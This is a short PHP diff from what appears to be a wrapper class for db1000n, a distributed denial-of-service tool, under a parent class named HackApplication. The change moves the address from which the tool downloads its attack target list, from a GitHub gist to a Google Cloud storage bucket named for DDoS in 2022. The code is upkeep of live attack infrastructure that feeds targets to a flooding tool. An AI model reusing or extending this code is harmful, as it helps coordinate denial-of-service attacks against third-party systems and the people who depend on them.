@@ -334,7 +334,7 @@ class db1000nApplication extends HackApplication
     {
         global $TEMP_DIR;
 
-        static::$configUrl = 'https://gist.githubusercontent.com/ddosukraine2022/f739250dba308a7a2215617b17114be9/raw/db1000n_targets.json';
+        static::$configUrl = 'https://storage.googleapis.com/ddos2022/db1000n_targets.json';
         static::$localConfigPath = $TEMP_DIR . '/db1000n-config.json';
         static::$useLocalConfig = false;
     }
